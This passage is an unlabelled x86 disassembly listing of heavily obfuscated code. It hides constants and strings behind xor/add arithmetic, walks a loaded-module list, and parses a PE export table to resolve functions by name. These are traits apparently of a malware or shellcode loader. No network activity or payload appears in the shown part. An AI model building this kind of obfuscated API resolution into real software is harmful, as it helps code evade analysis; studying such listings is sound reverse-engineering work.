  42774f:	mov    edi,DWORD PTR [ebp-0xc]
  427752:	mov    bx,WORD PTR [ebp-0x4]
  427756:	xor    edi,esi
  427758:	add    edi,eax
  42775a:	cmp    bx,di
  42775d:	je     0x427851
  427763:	mov    edi,DWORD PTR [ebp-0xc]
  427766:	mov    ebx,DWORD PTR [ebp+0xc]
  427769:	xor    edi,ecx
  42776b:	add    edi,edx
  42776d:	cmp    ebx,edi
  42776f:	mov    di,WORD PTR [ebp-0x4]
  427773:	mov    bx,WORD PTR [ebp+0x8]
  427777:	je     0x4277e2
  427779:	cmp    bx,di
  42777c:	je     0x4277eb
  42777e:	mov    edi,DWORD PTR [ebp-0x20]
  427781:	mov    bx,WORD PTR [ebp+0x8]
  427785:	xor    edi,esi
  427787:	add    edi,eax
  427789:	cmp    bx,di
  42778c:	jb     0x4277ac
  42778e:	mov    edi,DWORD PTR [ebp-0x2c]
  427791:	mov    bx,WORD PTR [ebp+0x8]
  427795:	xor    edi,esi
  427797:	add    edi,eax
  427799:	cmp    bx,di
  42779c:	ja     0x4277ac
  42779e:	movzx  edi,WORD PTR [ebp+0x8]
  4277a2:	movzx  ebx,WORD PTR [ebp-0x8]
  4277a6:	add    edi,ebx
  4277a8:	mov    WORD PTR [ebp+0x8],di
  4277ac:	mov    edi,DWORD PTR [ebp-0x20]
  4277af:	mov    bx,WORD PTR [ebp-0x4]
  4277b3:	xor    edi,esi
  4277b5:	add    edi,eax
  4277b7:	cmp    bx,di
  4277ba:	jb     0x4277da
  4277bc:	mov    edi,DWORD PTR [ebp-0x2c]
  4277bf:	mov    bx,WORD PTR [ebp-0x4]
  4277c3:	xor    edi,esi
  4277c5:	add    edi,eax
  4277c7:	cmp    bx,di
  4277ca:	ja     0x4277da
  4277cc:	movzx  edi,WORD PTR [ebp-0x4]
  4277d0:	movzx  ebx,WORD PTR [ebp-0x8]
  4277d4:	add    edi,ebx
  4277d6:	mov    WORD PTR [ebp-0x4],di
  4277da:	mov    di,WORD PTR [ebp-0x4]
  4277de:	mov    bx,WORD PTR [ebp+0x8]
  4277e2:	cmp    bx,di
  4277e5:	jne    0x4278df
  4277eb:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ee:	mov    ebx,DWORD PTR [ebp-0x10]
  4277f1:	xor    edi,ecx
  4277f3:	lea    edi,[edi+ebx*1+0x3272f1]
  4277fa:	mov    DWORD PTR [ebp-0x10],edi
  4277fd:	mov    edi,DWORD PTR [ebp-0x1c]
  427800:	mov    ebx,DWORD PTR [ebp-0x14]
  427803:	xor    edi,ecx
  427805:	lea    edi,[edi+ebx*1+0x3272f1]
  42780c:	mov    DWORD PTR [ebp-0x14],edi
  42780f:	mov    edi,DWORD PTR [ebp-0x24]
  427812:	mov    ebx,DWORD PTR [ebp-0x10]
  427815:	mov    di,WORD PTR [ebx+edi*2]
  427819:	mov    WORD PTR [ebp+0x8],di
  42781d:	mov    edi,DWORD PTR [ebp-0x28]
  427820:	mov    ebx,DWORD PTR [ebp-0x14]
  427823:	mov    di,WORD PTR [ebx+edi*2]
  427827:	mov    WORD PTR [ebp-0x4],di
  42782b:	mov    edi,DWORD PTR [ebp-0xc]
  42782e:	mov    bx,WORD PTR [ebp+0x8]
  427832:	xor    edi,esi
  427834:	add    edi,eax
  427836:	cmp    bx,di
  427839:	jne    0x42774f
  42783f:	mov    eax,DWORD PTR [ebp-0x18]
  427842:	mov    esi,DWORD PTR [ebp-0xc]
  427845:	xor    eax,ecx
  427847:	add    eax,edx
  427849:	imul   eax,esi
  42784c:	mov    DWORD PTR [ebp-0xc],eax
  42784f:	jmp    0x427863
  427851:	mov    eax,DWORD PTR [ebp-0xc]
  427854:	mov    esi,DWORD PTR [ebp-0x18]
  427857:	xor    eax,ecx
  427859:	lea    eax,[eax+esi*1+0x3272f1]
  427860:	mov    DWORD PTR [ebp-0x18],eax
  427863:	mov    eax,DWORD PTR [ebp-0x24]
  427866:	sub    eax,edx
  427868:	xor    eax,ecx
  42786a:	mov    DWORD PTR [ebp-0x30],eax
  42786d:	mov    eax,DWORD PTR [ebp-0x28]
  427870:	sub    eax,edx
  427872:	xor    eax,ecx
  427874:	mov    DWORD PTR [ebp-0x34],eax
  427877:	mov    eax,DWORD PTR [ebp-0x34]
  42787a:	mov    esi,DWORD PTR [ebp-0x1c]
  42787d:	xor    esi,ecx
  42787f:	add    esi,edx
  427881:	xor    eax,ecx
  427883:	add    eax,0x3272f1
  427888:	imul   esi,eax
  42788b:	mov    eax,DWORD PTR [ebp-0x14]
  42788e:	movzx  eax,WORD PTR [esi+eax*1]
  427892:	mov    esi,DWORD PTR [ebp-0x30]
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	xor    esi,ecx
  42789a:	add    esi,edx
  42789c:	xor    edi,ecx
  42789e:	add    edi,edx
  4278a0:	imul   edi,esi
  4278a3:	mov    esi,DWORD PTR [ebp-0x10]
  4278a6:	movzx  esi,WORD PTR [edi+esi*1]
  4278aa:	sub    eax,edx
  4278ac:	sub    esi,edx
  4278ae:	xor    eax,ecx
  4278b0:	xor    esi,ecx
  4278b2:	cmp    esi,eax
  4278b4:	jne    0x4278df
  4278b6:	mov    eax,DWORD PTR [ebp-0x30]
  4278b9:	mov    esi,DWORD PTR [ebp-0x1c]
  4278bc:	xor    eax,ecx
  4278be:	add    eax,0x3272f1
  4278c3:	xor    esi,ecx
  4278c5:	add    esi,edx
  4278c7:	imul   esi,eax
  4278ca:	mov    eax,DWORD PTR [ebp-0x10]
  4278cd:	movzx  eax,WORD PTR [esi+eax*1]
  4278d1:	mov    esi,DWORD PTR [ebp-0xc]
  4278d4:	sub    eax,edx
  4278d6:	xor    eax,ecx
  4278d8:	cmp    eax,esi
  4278da:	mov    eax,DWORD PTR [ebp-0xc]
  4278dd:	je     0x4278e2
  4278df:	mov    eax,DWORD PTR [ebp-0x18]
  4278e2:	pop    edi
  4278e3:	xor    eax,ecx
  4278e5:	pop    esi
  4278e6:	add    eax,edx
  4278e8:	pop    ebx
  4278e9:	leave  
  4278ea:	ret    0x8
  4278ed:	push   ebp
  4278ee:	mov    ebp,esp
  4278f0:	push   ecx
  4278f1:	mov    cx,WORD PTR [eax]
  4278f4:	push   esi
  4278f5:	mov    esi,0x3b5a
  4278fa:	sub    cx,si
  4278fd:	mov    esi,0x8a98
  427902:	xor    cx,si
  427905:	mov    esi,0x4e3e
  42790a:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427911:	mov    edx,0xf89c85a5
  427916:	cmp    cx,si
  427919:	je     0x427978
  42791b:	push   ebx
  42791c:	push   edi
  42791d:	movzx  ecx,cx
  427920:	mov    edi,0xffcd8d0f
  427925:	mov    esi,0x75108aa
  42792a:	mov    ebx,0x4f9a
  42792f:	cmp    cx,bx
  427932:	jne    0x427937
  427934:	mov    DWORD PTR [ebp-0x4],edx
  427937:	lea    edx,[edi+0x1]
  42793a:	xor    edx,esi
  42793c:	mov    edi,edx
  42793e:	xor    edi,esi
  427940:	mov    cx,WORD PTR [eax+edi*2+0x64e5e2]
  427948:	mov    ebx,0x3b5a
  42794d:	sub    cx,bx
  427950:	mov    ebx,0x8a98
  427955:	xor    cx,bx
  427958:	mov    ebx,0x4e3e
  42795d:	cmp    cx,bx
  427960:	jne    0x42792a
  427962:	mov    ecx,DWORD PTR [ebp-0x4]
  427965:	pop    edi
  427966:	pop    ebx
  427967:	cmp    ecx,0xf89c85a4
  42796d:	je     0x427978
  42796f:	xor    ecx,esi
  427971:	lea    eax,[eax+ecx*2+0x64e5e4]
  427978:	pop    esi
  427979:	leave  
  42797a:	ret    
  42797b:	push   ebp
  42797c:	mov    ebp,esp
  42797e:	push   ecx
  42797f:	push   esi
  427980:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427987:	mov    esi,0xf89c85a5
  42798c:	call   0x4278ed
  427991:	mov    cl,BYTE PTR [eax]
  427993:	dec    cl
  427995:	xor    cl,0x7c
  427998:	cmp    cl,0x83
  42799b:	je     0x427a00
  42799d:	push   ebx
  42799e:	push   edi
  42799f:	mov    edx,eax
  4279a1:	mov    edi,0xffcd8d0f
  4279a6:	mov    ecx,0x75108aa
  4279ab:	mov    dx,WORD PTR [edx]
  4279ae:	mov    ebx,0x3b5a
  4279b3:	sub    dx,bx
  4279b6:	mov    ebx,0x8a98
  4279bb:	xor    dx,bx
  4279be:	mov    ebx,0x4e4c
  4279c3:	cmp    dx,bx
  4279c6:	jne    0x4279cb
  4279c8:	mov    DWORD PTR [ebp-0x4],esi
  4279cb:	lea    esi,[edi+0x1]
  4279ce:	xor    esi,ecx
  4279d0:	mov    edi,esi
  4279d2:	xor    edi,ecx
  4279d4:	lea    edx,[eax+edi*2+0x64e5e2]
  4279db:	mov    bl,BYTE PTR [edx]
  4279dd:	dec    bl
  4279df:	xor    bl,0x7c
  4279e2:	cmp    bl,0x83
  4279e5:	jne    0x4279ab
  4279e7:	mov    edx,DWORD PTR [ebp-0x4]
  4279ea:	pop    edi
  4279eb:	pop    ebx
  4279ec:	cmp    edx,0xf89c85a4
  4279f2:	je     0x427a00
  4279f4:	xor    edx,ecx
  4279f6:	xor    ecx,ecx
  4279f8:	mov    WORD PTR [eax+edx*2+0x64e5e2],cx
  427a00:	pop    esi
  427a01:	leave  
  427a02:	ret    
  427a03:	push   ebp
  427a04:	mov    ebp,esp
  427a06:	push   ecx
  427a07:	push   esi
  427a08:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427a0f:	mov    esi,0xf89c85a5
  427a14:	call   0x4278ed
  427a19:	mov    cx,WORD PTR [eax]
  427a1c:	mov    edx,0x3b5a
  427a21:	sub    cx,dx
  427a24:	mov    edx,0x8a98
  427a29:	xor    cx,dx
  427a2c:	mov    edx,0x4e3e
  427a31:	cmp    cx,dx
  427a34:	je     0x427a8d
  427a36:	push   ebx
  427a37:	push   edi
  427a38:	movzx  ecx,cx
  427a3b:	mov    edx,0xffcd8d0f
  427a40:	mov    edi,0x75108aa
  427a45:	mov    ebx,0x4e4c
  427a4a:	cmp    cx,bx
  427a4d:	jne    0x427a52
  427a4f:	mov    DWORD PTR [ebp-0x4],esi
  427a52:	lea    esi,[edx+0x1]
  427a55:	xor    esi,edi
  427a57:	mov    edx,esi
  427a59:	xor    edx,edi
  427a5b:	mov    cx,WORD PTR [eax+edx*2+0x64e5e2]
  427a63:	mov    ebx,0x3b5a
  427a68:	sub    cx,bx
  427a6b:	mov    ebx,0x8a98
  427a70:	xor    cx,bx
  427a73:	mov    ebx,0x4e3e
  427a78:	cmp    cx,bx
  427a7b:	jne    0x427a45
  427a7d:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  427a84:	pop    edi
  427a85:	pop    ebx
  427a86:	je     0x427a8d
  427a88:	xor    eax,eax
  427a8a:	inc    eax
  427a8b:	jmp    0x427a8f
  427a8d:	xor    eax,eax
  427a8f:	pop    esi
  427a90:	leave  
  427a91:	ret    
  427a92:	push   ebp
  427a93:	mov    ebp,esp
  427a95:	push   ecx
  427a96:	mov    eax,DWORD PTR [ebp+0x8]
  427a99:	movzx  ecx,WORD PTR [eax]
  427a9c:	push   esi
  427a9d:	lea    eax,[ecx-0x3b5a]
  427aa3:	mov    esi,0x8a98
  427aa8:	push   edi
  427aa9:	xor    eax,esi
  427aab:	mov    edi,0x4e3e
  427ab0:	mov    DWORD PTR [ebp-0x4],edx
  427ab3:	cmp    ax,di
  427ab6:	je     0x427ae3
  427ab8:	mov    eax,DWORD PTR [ebp+0x8]
  427abb:	sub    eax,edx
  427abd:	mov    DWORD PTR [ebp+0x8],eax
  427ac0:	jmp    0x427ac5
  427ac2:	mov    eax,DWORD PTR [ebp+0x8]
  427ac5:	mov    WORD PTR [edx],cx
  427ac8:	add    edx,0x2
  427acb:	movzx  edi,WORD PTR [eax+edx*1]
  427acf:	mov    ecx,edi
  427ad1:	add    edi,0xffffc4a6
  427ad7:	xor    edi,esi
  427ad9:	mov    eax,0x4e3e
  427ade:	cmp    di,ax
  427ae1:	jne    0x427ac2
  427ae3:	xor    eax,eax
  427ae5:	pop    edi
  427ae6:	mov    WORD PTR [edx],ax
  427ae9:	mov    eax,DWORD PTR [ebp-0x4]
  427aec:	pop    esi
  427aed:	leave  
  427aee:	ret    0x4
  427af1:	push   ebp
  427af2:	mov    ebp,esp
  427af4:	sub    esp,0x18
  427af7:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  427afe:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  427b05:	mov    ecx,DWORD PTR [ebp-0x8]
  427b08:	push   esi
  427b09:	mov    eax,0x75108aa
  427b0e:	xor    ecx,eax
  427b10:	mov    esi,0x3272f1
  427b15:	add    ecx,esi
  427b17:	mov    DWORD PTR [ebp-0x4],ecx
  427b1a:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  427b21:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  427b28:	push   edi
  427b29:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  427b30:	jmp    0x427bd1
  427b35:	mov    ecx,DWORD PTR [ebp-0x4]
  427b38:	mov    edx,DWORD PTR [ebp+0x10]
  427b3b:	sub    edx,ecx
  427b3d:	mov    ecx,DWORD PTR [ebp-0xc]
  427b40:	xor    ecx,eax
  427b42:	add    ecx,esi
  427b44:	cmp    edx,ecx
  427b46:	jbe    0x427b63
  427b48:	mov    edx,DWORD PTR [ebp-0x4]
  427b4b:	add    edx,DWORD PTR [ebp+0x8]
  427b4e:	mov    ecx,DWORD PTR [ebp-0x4]
  427b51:	add    ecx,DWORD PTR [ebp+0xc]
  427b54:	mov    edi,DWORD PTR [ecx]
  427b56:	mov    DWORD PTR [edx],edi
  427b58:	mov    ecx,DWORD PTR [ecx+0x4]
  427b5b:	mov    DWORD PTR [edx+0x4],ecx
  427b5e:	mov    ecx,DWORD PTR [ebp-0xc]
  427b61:	jmp    0x427bb0
  427b63:	mov    ecx,DWORD PTR [ebp-0x4]
  427b66:	mov    edx,DWORD PTR [ebp+0x10]
  427b69:	sub    edx,ecx
  427b6b:	mov    ecx,DWORD PTR [ebp-0x10]
  427b6e:	xor    ecx,eax
  427b70:	add    ecx,esi
  427b72:	cmp    edx,ecx
  427b74:	mov    ecx,DWORD PTR [ebp-0x4]
  427b77:	jbe    0x427b8b
  427b79:	add    ecx,DWORD PTR [ebp+0x8]
  427b7c:	mov    edx,DWORD PTR [ebp-0x4]
  427b7f:	add    edx,DWORD PTR [ebp+0xc]
  427b82:	mov    edx,DWORD PTR [edx]
  427b84:	mov    DWORD PTR [ecx],edx
  427b86:	mov    ecx,DWORD PTR [ebp-0x10]
  427b89:	jmp    0x427bb0
  427b8b:	mov    edx,DWORD PTR [ebp+0x10]
  427b8e:	sub    edx,ecx
  427b90:	mov    ecx,DWORD PTR [ebp-0x14]
  427b93:	xor    ecx,eax
  427b95:	add    ecx,esi
  427b97:	cmp    edx,ecx
  427b99:	mov    ecx,DWORD PTR [ebp-0x4]
  427b9c:	jbe    0x427bc1
  427b9e:	add    ecx,DWORD PTR [ebp+0x8]
  427ba1:	mov    edx,DWORD PTR [ebp-0x4]
  427ba4:	add    edx,DWORD PTR [ebp+0xc]
  427ba7:	mov    dx,WORD PTR [edx]
  427baa:	mov    WORD PTR [ecx],dx
  427bad:	mov    ecx,DWORD PTR [ebp-0x14]
  427bb0:	mov    edx,DWORD PTR [ebp-0x4]
  427bb3:	xor    ecx,eax
  427bb5:	lea    ecx,[ecx+edx*1+0x3272f1]
  427bbc:	mov    DWORD PTR [ebp-0x4],ecx
  427bbf:	jmp    0x427bd1
  427bc1:	add    ecx,DWORD PTR [ebp+0x8]
  427bc4:	mov    edx,DWORD PTR [ebp-0x4]
  427bc7:	add    edx,DWORD PTR [ebp+0xc]
  427bca:	mov    dl,BYTE PTR [edx]
  427bcc:	mov    BYTE PTR [ecx],dl
  427bce:	inc    DWORD PTR [ebp-0x4]
  427bd1:	mov    ecx,DWORD PTR [ebp-0x18]
  427bd4:	mov    edx,DWORD PTR [ebp+0x10]
  427bd7:	xor    ecx,eax
  427bd9:	add    ecx,esi
  427bdb:	imul   ecx,edx
  427bde:	mov    edx,DWORD PTR [ebp-0x8]
  427be1:	mov    edi,DWORD PTR [ebp-0x4]
  427be4:	xor    edx,eax
  427be6:	lea    edx,[edx+edi*1+0x3272f1]
  427bed:	cmp    edx,ecx
  427bef:	jb     0x427b35
  427bf5:	pop    edi
  427bf6:	pop    esi
  427bf7:	leave  
  427bf8:	ret    0xc
  427bfb:	push   ebp
  427bfc:	mov    ebp,esp
  427bfe:	sub    esp,0xc
  427c01:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427c08:	push   esi
  427c09:	mov    esi,eax
  427c0b:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  427c12:	mov    edx,DWORD PTR [ebp-0x4]
  427c15:	mov    eax,0x75108aa
  427c1a:	xor    edx,eax
  427c1c:	mov    ecx,0x3272f1
  427c21:	add    edx,ecx
  427c23:	cmp    esi,edx
  427c25:	je     0x427c67
  427c27:	push   ebx
  427c28:	push   edi
  427c29:	mov    edx,DWORD PTR [ebp-0x8]
  427c2c:	mov    ebx,DWORD PTR [ebp+0x8]
  427c2f:	xor    edx,eax
  427c31:	mov    edi,0xffcd8d0f
  427c36:	sub    edi,edx
  427c38:	add    esi,edi
  427c3a:	lea    edx,[esi-0x3272f1]
  427c40:	xor    edx,eax
  427c42:	mov    DWORD PTR [ebp-0xc],edx
  427c45:	mov    edx,DWORD PTR [ebp-0x4]
  427c48:	mov    edi,DWORD PTR [ebp-0xc]
  427c4b:	xor    dl,0xaa
  427c4e:	sub    dl,0xf
  427c51:	xor    edi,eax
  427c53:	mov    BYTE PTR [edi+ebx*1+0x3272f1],dl
  427c5a:	mov    edx,DWORD PTR [ebp-0x4]
  427c5d:	xor    edx,eax
  427c5f:	add    edx,ecx
  427c61:	cmp    esi,edx
  427c63:	jne    0x427c29
  427c65:	pop    edi
  427c66:	pop    ebx
  427c67:	pop    esi
  427c68:	leave  
  427c69:	ret    0x4
  427c6c:	push   ebp
  427c6d:	mov    ebp,esp
  427c6f:	sub    esp,0x21c
  427c75:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427c7c:	mov    DWORD PTR [ebp-0x14],0xf89c85ba
  427c83:	mov    eax,DWORD PTR [ebp+0x10]
  427c86:	mov    eax,DWORD PTR [ebp-0x4]
  427c89:	mov    ecx,DWORD PTR [ebp+0x8]
  427c8c:	push   esi
  427c8d:	push   edi
  427c8e:	mov    edi,0x75108aa
  427c93:	xor    eax,edi
  427c95:	mov    esi,0x3272f1
  427c9a:	add    eax,esi
  427c9c:	cmp    eax,ecx
  427c9e:	mov    eax,DWORD PTR [ebp-0x4]
  427ca1:	jne    0x427cac
  427ca3:	xor    eax,edi
  427ca5:	add    eax,esi
  427ca7:	jmp    0x427d58
  427cac:	mov    ecx,DWORD PTR [ebp+0xc]
  427caf:	xor    eax,edi
  427cb1:	add    eax,esi
  427cb3:	cmp    eax,ecx
  427cb5:	jne    0x427cbc
  427cb7:	mov    eax,DWORD PTR [ebp-0x4]
  427cba:	jmp    0x427ca3
  427cbc:	lea    eax,[ebp-0x21c]
  427cc2:	mov    DWORD PTR [ebp-0x8],eax
  427cc5:	mov    eax,DWORD PTR [ebp+0xc]
  427cc8:	mov    DWORD PTR [ebp-0x10],eax
  427ccb:	mov    eax,DWORD PTR [ebp-0x4]
  427cce:	xor    eax,edi
  427cd0:	add    eax,esi
  427cd2:	mov    DWORD PTR [ebp+0x10],eax
  427cd5:	mov    eax,DWORD PTR [ebp+0xc]
  427cd8:	push   ebx
  427cd9:	call   0x427a03
  427cde:	mov    ebx,eax
  427ce0:	mov    eax,DWORD PTR [ebp+0x8]
  427ce3:	mov    eax,DWORD PTR [eax+0x14]
  427ce6:	jmp    0x427d40
  427ce8:	mov    eax,DWORD PTR [ebp+0xc]
  427ceb:	sub    eax,0x8
  427cee:	mov    DWORD PTR [ebp-0xc],eax
  427cf1:	mov    eax,DWORD PTR [ebp-0xc]
  427cf4:	mov    eax,DWORD PTR [eax+0x28]
  427cf7:	call   0x4278ed
  427cfc:	mov    DWORD PTR [ebp+0x10],eax
  427cff:	push   DWORD PTR [ebp+0x10]
  427d02:	mov    edx,DWORD PTR [ebp-0x8]
  427d05:	call   0x427a92
  427d0a:	mov    eax,DWORD PTR [ebp-0x4]
  427d0d:	xor    eax,edi
  427d0f:	add    eax,esi
  427d11:	cmp    eax,ebx
  427d13:	jne    0x427d1d
  427d15:	mov    eax,DWORD PTR [ebp-0x8]
  427d18:	call   0x42797b
  427d1d:	mov    eax,DWORD PTR [ebp-0x14]
  427d20:	xor    eax,edi
  427d22:	add    eax,esi
  427d24:	push   eax
  427d25:	push   DWORD PTR [ebp-0x10]
  427d28:	mov    eax,DWORD PTR [ebp-0x8]
  427d2b:	call   0x4276a7
  427d30:	mov    ecx,DWORD PTR [ebp-0x4]
  427d33:	xor    ecx,edi
  427d35:	add    ecx,esi
  427d37:	cmp    eax,ecx
  427d39:	je     0x427d5e
  427d3b:	mov    eax,DWORD PTR [ebp+0xc]
  427d3e:	mov    eax,DWORD PTR [eax]
  427d40:	mov    DWORD PTR [ebp+0xc],eax
  427d43:	mov    eax,DWORD PTR [ebp+0x8]
  427d46:	mov    ecx,DWORD PTR [ebp+0xc]
  427d49:	add    eax,0x14
  427d4c:	cmp    ecx,eax
  427d4e:	jne    0x427ce8
  427d50:	mov    eax,DWORD PTR [ebp-0x4]
  427d53:	xor    eax,edi
  427d55:	add    eax,esi
  427d57:	pop    ebx
  427d58:	pop    edi
  427d59:	pop    esi
  427d5a:	leave  
  427d5b:	ret    0xc
  427d5e:	mov    eax,DWORD PTR [ebp-0xc]
  427d61:	mov    eax,DWORD PTR [eax+0x18]
  427d64:	jmp    0x427d57
  427d66:	push   ebp
  427d67:	mov    ebp,esp
  427d69:	mov    eax,DWORD PTR [ebp+0xc]
  427d6c:	sub    esp,0x10
  427d6f:	cmp    DWORD PTR [ebp+0x8],0x0
  427d73:	push   ebx
  427d74:	push   esi
  427d75:	push   edi
  427d76:	je     0x427e2b
  427d7c:	test   eax,eax
  427d7e:	je     0x427e2b
  427d84:	movzx  eax,WORD PTR [eax+0x20]
  427d88:	mov    ecx,eax
  427d8a:	mov    DWORD PTR [ebp-0x10],eax
  427d8d:	xor    edx,edx
  427d8f:	and    DWORD PTR [ebp-0x8],edx
  427d92:	mov    eax,0x8a98
  427d97:	xor    ecx,eax
  427d99:	add    ecx,0x3b5a
  427d9f:	mov    DWORD PTR [ebp-0xc],ecx
  427da2:	and    DWORD PTR [ebp-0x4],0x0
  427da6:	xor    ecx,ecx
  427da8:	push   0x7d
  427daa:	pop    edi
  427dab:	cmp    cx,WORD PTR [ebp-0xc]
  427daf:	jae    0x427e15
  427db1:	lea    esi,[edx-0x3b5a]
  427db7:	xor    esi,eax
  427db9:	movzx  ecx,WORD PTR [ebp-0x4]
  427dbd:	mov    ebx,DWORD PTR [ebp+0xc]
  427dc0:	lea    ecx,[ebx+ecx*4]
  427dc3:	cmp    WORD PTR [ecx+0x2],si
  427dc7:	jne    0x427e00
  427dc9:	movzx  ecx,WORD PTR [ecx]
  427dcc:	mov    edi,0x4e3e
  427dd1:	cmp    cx,di
  427dd4:	jne    0x427de2
  427dd6:	mov    ebx,DWORD PTR [ebp+0x8]
  427dd9:	movzx  edi,dx
  427ddc:	cmp    BYTE PTR [edi+ebx*1],0x0
  427de0:	je     0x427e0f
  427de2:	mov    ebx,DWORD PTR [ebp+0x8]
  427de5:	movzx  edi,dx
  427de8:	movsx  di,BYTE PTR [edi+ebx*1]
  427ded:	mov    ebx,0x3b5a
  427df2:	sub    di,bx
  427df5:	xor    di,ax
  427df8:	cmp    cx,di
  427dfb:	je     0x427e0f
  427dfd:	push   0xffffff83
  427dff:	pop    edi
  427e00:	inc    DWORD PTR [ebp-0x4]
  427e03:	mov    cx,WORD PTR [ebp-0xc]
  427e07:	cmp    WORD PTR [ebp-0x4],cx
  427e0b:	jb     0x427db9
  427e0d:	jmp    0x427e15
  427e0f:	inc    DWORD PTR [ebp-0x8]
  427e12:	push   0x7c
  427e14:	pop    edi
  427e15:	mov    esi,DWORD PTR [ebp+0x8]
  427e18:	movzx  ecx,dx
  427e1b:	cmp    BYTE PTR [ecx+esi*1],0x0
  427e1f:	je     0x427e34
  427e21:	inc    edx
  427e22:	cmp    edi,0xffffff83
  427e25:	jne    0x427da2
  427e2b:	xor    eax,eax
  427e2d:	pop    edi
  427e2e:	pop    esi
  427e2f:	pop    ebx
  427e30:	leave  
  427e31:	ret    0x8
  427e34:	mov    ecx,DWORD PTR [ebp-0x8]
  427e37:	add    ecx,0xffffc4a6
  427e3d:	xor    cx,ax
  427e40:	xor    eax,eax
  427e42:	cmp    cx,WORD PTR [ebp-0x10]
  427e46:	sete   al
  427e49:	jmp    0x427e2d
  427e4b:	push   ebp
  427e4c:	mov    ebp,esp
  427e4e:	sub    esp,0x50
  427e51:	push   edi
  427e52:	mov    edi,eax
  427e54:	mov    eax,DWORD PTR [edi+0x1a8]
  427e5a:	cmp    DWORD PTR [eax],0x0
  427e5d:	jne    0x427e66
  427e5f:	xor    eax,eax
  427e61:	jmp    0x427f97
  427e66:	push   DWORD PTR [ebp+0x8]
  427e69:	push   0x2c
  427e6b:	pop    eax
  427e6c:	call   0x427bfb
  427e71:	mov    edx,DWORD PTR [edi+0x1ac]
  427e77:	lea    eax,[edi+0x22]
  427e7a:	mov    DWORD PTR [ebp-0x4c],eax
  427e7d:	lea    eax,[edi+0x44]
  427e80:	mov    DWORD PTR [ebp-0x48],eax
  427e83:	lea    eax,[edi+0x66]
  427e86:	mov    DWORD PTR [ebp-0x44],eax
  427e89:	lea    eax,[edi+0x88]
  427e8f:	mov    DWORD PTR [ebp-0x40],eax
  427e92:	lea    eax,[edi+0xaa]
  427e98:	mov    DWORD PTR [ebp-0x3c],eax
  427e9b:	lea    eax,[edi+0xcc]
  427ea1:	mov    DWORD PTR [ebp-0x38],eax
  427ea4:	lea    eax,[edi+0xee]
  427eaa:	mov    DWORD PTR [ebp-0x34],eax
  427ead:	lea    eax,[edi+0x110]
  427eb3:	mov    DWORD PTR [ebp-0x30],eax
  427eb6:	lea    eax,[edi+0x132]
  427ebc:	mov    DWORD PTR [ebp-0x2c],eax
  427ebf:	lea    eax,[edi+0x154]
  427ec5:	push   edi
  427ec6:	mov    DWORD PTR [ebp-0x50],edi
  427ec9:	mov    DWORD PTR [ebp-0x28],eax
  427ecc:	call   0x427fcb
  427ed1:	push   eax
  427ed2:	mov    eax,DWORD PTR [edi+0x1a8]
  427ed8:	push   DWORD PTR [eax]
  427eda:	call   0x427c6c
  427edf:	mov    DWORD PTR [ebp-0x10],eax
  427ee2:	test   eax,eax
  427ee4:	je     0x427f97
  427eea:	mov    ecx,DWORD PTR [eax+0x3c]
  427eed:	push   ebx
  427eee:	push   esi
  427eef:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  427ef3:	add    esi,eax
  427ef5:	mov    edi,DWORD PTR [esi+0x24]
  427ef8:	mov    ecx,DWORD PTR [esi+0x1c]
  427efb:	mov    edx,DWORD PTR [esi+0x20]
  427efe:	mov    ebx,DWORD PTR [esi+0x18]
  427f01:	add    edi,eax
  427f03:	mov    DWORD PTR [ebp-0x20],edi
  427f06:	mov    edi,DWORD PTR [esi+0x14]
  427f09:	add    ecx,eax
  427f0b:	add    edx,eax
  427f0d:	mov    DWORD PTR [ebp-0xc],ecx
  427f10:	mov    DWORD PTR [ebp-0x1c],edx
  427f13:	mov    DWORD PTR [ebp-0x8],edi
  427f16:	cmp    edi,ebx
  427f18:	ja     0x427f1d
  427f1a:	mov    DWORD PTR [ebp-0x8],ebx
  427f1d:	xor    ebx,ebx
  427f1f:	mov    DWORD PTR [ebp-0x18],ebx
  427f22:	cmp    DWORD PTR [ebp-0x8],ebx
  427f25:	jbe    0x427f95
  427f27:	jmp    0x427f2c
  427f29:	mov    edx,DWORD PTR [ebp-0x1c]
  427f2c:	mov    edi,DWORD PTR [ebp-0x20]
  427f2f:	movzx  edi,WORD PTR [edi+ebx*2]
  427f33:	cmp    ebx,DWORD PTR [esi+0x18]
  427f36:	jae    0x427f95
  427f38:	cmp    edi,DWORD PTR [esi+0x14]
  427f3b:	jae    0x427f95
  427f3d:	mov    ebx,DWORD PTR [edx+ebx*4]
  427f40:	mov    edx,DWORD PTR [ebp+0x8]
  427f43:	mov    edi,DWORD PTR [ecx+edi*4]
  427f46:	mov    DWORD PTR [ebp-0x4],edx
  427f49:	lea    edx,[ebp-0x50]
  427f4c:	add    ebx,eax
  427f4e:	add    edi,eax
  427f50:	sub    edx,DWORD PTR [ebp+0x8]
  427f53:	mov    DWORD PTR [ebp-0x14],0xb
  427f5a:	mov    DWORD PTR [ebp-0x24],edx
  427f5d:	mov    edx,DWORD PTR [ebp-0x4]
  427f60:	cmp    DWORD PTR [edx],0x0
  427f63:	jne    0x427f80
  427f65:	mov    eax,DWORD PTR [ebp-0x24]
  427f68:	push   DWORD PTR [eax+edx*1]
  427f6b:	push   ebx
  427f6c:	call   0x427d66
  427f71:	mov    ecx,DWORD PTR [ebp-0xc]
  427f74:	test   eax,eax
  427f76:	je     0x427f7d
  427f78:	mov    eax,DWORD PTR [ebp-0x4]
  427f7b:	mov    DWORD PTR [eax],edi
  427f7d:	mov    eax,DWORD PTR [ebp-0x10]
  427f80:	add    DWORD PTR [ebp-0x4],0x4
  427f84:	dec    DWORD PTR [ebp-0x14]
  427f87:	jne    0x427f5d
  427f89:	mov    ebx,DWORD PTR [ebp-0x18]
  427f8c:	inc    ebx
  427f8d:	mov    DWORD PTR [ebp-0x18],ebx
